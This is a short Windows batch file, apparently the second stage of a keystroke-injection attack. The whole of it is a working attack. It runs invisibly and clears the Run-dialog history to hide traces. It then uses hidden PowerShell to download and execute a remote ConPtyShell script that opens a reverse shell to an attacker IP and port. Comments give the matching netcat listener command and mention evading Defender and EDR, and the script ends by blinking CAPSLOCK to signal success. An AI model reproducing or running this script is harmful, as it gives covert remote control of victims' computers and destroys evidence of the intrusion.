@echo off
REM this is stage #2 (window is INVISIBLE - take as long as you need...)

REM clear run history
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

REM open reverse shell (potentially blocked by EDR)
REM -> on server side run "stty raw -echo; (stty size; cat) | nc -lvnp 3001"
REM -> modify IP and port in following command
REM -> the ps1 file is blocked by Windows Defender
start /b powershell -NoP -W Hidden -Sta -Command "iex(iwr https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001"
timeout /T 5 /NOBREAK

REM blink CAPSLOCK 2x short, 1x long
start /b /wait powershell -NoP -W Hidden -Sta -Command "$wsh = New-Object -ComObject WScript.Shell; for($i=0;$i -lt 2;$i++) { $wsh.SendKeys('{CAPSLOCK}'); sleep -m 200; $wsh.SendKeys('{CAPSLOCK}'); sleep -m 200; }; $wsh.SendKeys('{CAPSLOCK}'); sleep -m 1000; $wsh.SendKeys('{CAPSLOCK}'); sleep -m 200;"